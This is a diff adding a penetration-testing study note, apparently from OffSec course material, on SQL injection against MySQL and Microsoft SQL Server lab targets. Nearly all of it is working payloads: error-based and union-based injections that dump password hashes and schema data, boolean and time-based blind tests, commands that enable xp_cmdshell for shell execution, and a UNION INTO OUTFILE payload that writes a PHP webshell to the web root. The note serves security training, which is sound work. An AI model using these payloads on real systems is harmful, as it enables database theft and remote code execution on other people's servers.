@@ -1,0 +1,59 @@
+# Attacks
+- [[MySql]]
+
+### Error-based Paylodas
+
+- `offsec' OR 1=1 -- //`
+  - `SELECT * FROM users WHERE user_name= 'offsec' OR 1=1 --`
+- we could also take advantage of the error-based payload by enumerating the database directly.
+  - `' or 1=1 in (select @@version) -- //`
+  - `' OR 1=1 in (SELECT * FROM users) -- //`
+  - `' or 1=1 in (SELECT password FROM users) -- //`
+- This is somewhat helpful, as we managed to retrieve all user password hashes; however, we don't know which user each password hash corresponds to. We can solve the issue by adding a WHERE clause specifying which user's password we want to retrieve, in this case admin.
+  - `' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //`
+
+### Union-based Payloads
+
+- 2 Requirements
+  - The injected UNION query has to include the same number of columns as the original query.
+  - The data types need to be compatible between each column.
+- To discover the correct number of columns, we can submit the following injected query into the search bar:
+  - `' ORDER BY 1-- //`
+-  we can attempt our first attack by enumerating the current database name, user, and MySQL version.
+  - `%' UNION SELECT database(), user(), @@version, null, null -- //`
+- let's update our query by shifting all the enumerating functions to the right-most place, avoiding any type mismatches.
+  - `' UNION SELECT null, null, database(), user(), @@version  -- //`
+- We can start by enumerating the *information schema* of the current database from the *information_schema.columns* table.
+  - `' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //`
+- Interestingly, we discovered a new table named users that contains four columns, including one named password.
+  - `' UNION SELECT null, username, password, description, null FROM users -- //`
+
+### Blind SQL Injections (Boolean/Time)
+- To test for boolean-based SQLi, we can try to append the below payload to the URL:
+  - `http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //`
+    - Since 1=1 will always be TRUE, the application will return the values only if the user is present in the database.
+- We can achieve the same result by using a time-based SQLi payload:
+  - `http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //`
+
+#### Manual Code Execution
+- In Microsoft SQL Server, the xp_cmdshell1 function takes a string and passes it to a command shell for execution. The function returns any output as rows of text. The function is disabled by default and, once enabled, it must be called with the EXECUTE keyword instead of SELECT.
+- In our database, the Administrator user already has the appropriate permissions. Let's enable xp_cmdshell by simulating a SQL injection via the **impacket-mssqlclient** tool.
+  - `impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth`
+  - `EXECUTE sp_configure 'show advanced options', 1;`
+  - `RECONFIGURE;`
+  - `EXECUTE sp_configure 'xp_cmdshell', 1;`
+  - `RECONFIGURE;`
+- With this feature enabled, we can execute any Windows shell command through the EXECUTE statement followed by the feature name.
+  - `EXECUTE xp_cmdshell 'whoami';`
+### SELECT INTO_OUTFILE
+- Although the various MySQL database variants don't offer a single function to escalate to RCE, we can abuse the SELECT INTO_OUTFILE2 statement to write files on the web server.
+- Requirement:
+  - For this attack to work, the file location must be writable to the OS user running the database software.
+Scenario:
+- As an example, let's resume the UNION payload on our MySQL target application we explored previously, expanding the query that writes a webshell3 on disk.
+- We'll issue the UNION SELECT SQL keywords to include a single PHP line into the first column and save it as webshell.php in a writable web folder.
+  - `' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //`
+- The written PHP code file results in the following:
+  - `<? system($_REQUEST['cmd']); ?>`
+### Automating the Attack
+- [[sqlmap]]
